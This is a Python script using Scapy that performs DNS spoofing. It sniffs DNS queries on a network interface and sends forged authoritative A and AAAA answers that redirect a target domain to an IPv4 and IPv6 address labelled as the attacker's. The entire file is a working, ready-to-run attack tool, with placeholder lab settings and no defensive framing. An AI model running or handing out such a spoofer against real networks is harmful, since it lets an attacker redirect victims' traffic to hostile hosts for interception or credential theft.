from scapy.all import *
import netifaces

# Configuration

FAKE_DOMAIN = b"example.com."
FAKE_IP_V4  = "10.0.0.190"     # Attacker IPv4 address
FAKE_IP_V6  = "fd00::190"      # Attacker IPv6 address (ULA)
INTERFACE   = "ens33"          # Attacker interface

# DNS Spoofing Function

def spoof_dns(packet):
    try:
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            qname = packet[DNS].qd.qname

            if FAKE_DOMAIN in qname:
                # Get the query type safely
                try:
                    query_type = packet[DNS].qd.qtype
                except AttributeError:
                    print(f"[-] Could not get query type for {qname.decode()}")
                    return
                
                # Type 1 = A record (IPv4)
                if query_type == 1:
                    print(f"[+] Spoofing DNS A record for {qname.decode()} -> {FAKE_IP_V4}")
                    
                    spoofed_pkt = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=53) /
                        DNS(
                            id=packet[DNS].id,
                            qr=1,      # response
                            aa=1,
                            qd=packet[DNS].qd,
                            an=DNSRR(
                                rrname=qname,
                                type=1,    # A record
                                ttl=10,
                                rdata=FAKE_IP_V4
                            )
                        )
                    )
                    send(spoofed_pkt, verbose=False)
                
                # Type 28 = AAAA record (IPv6)
                elif query_type == 28:
                    print(f"[+] Spoofing DNS AAAA record for {qname.decode()} -> {FAKE_IP_V6}")
                    
                    spoofed_pkt = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=53) /
                        DNS(
                            id=packet[DNS].id,
                            qr=1,      # response
                            aa=1,
                            qd=packet[DNS].qd,
                            an=DNSRR(
                                rrname=qname,
                                type=28,   # AAAA record
                                ttl=10,
                                rdata=FAKE_IP_V6
                            )
                        )
                    )
                    send(spoofed_pkt, verbose=False)
                
                else:
                    print(f"[·] Ignoring query type {query_type} for {qname.decode()}")
    
    except Exception as e:
        print(f"[-] Error processing packet: {e}")

# Start Sniffing

print("[*] DNS spoofing started")
print(f"[*] Spoofing {FAKE_DOMAIN.decode()} to:")
print(f"    IPv4 (A):    {FAKE_IP_V4}")
print(f"    IPv6 (AAAA): {FAKE_IP_V6}")
print()

try:
    sniff(filter="udp port 53", iface=INTERFACE, prn=spoof_dns)
except KeyboardInterrupt:
    print("\n[*] DNS spoofing stopped")
except Exception as e:
    print(f"[-] Error: {e}")
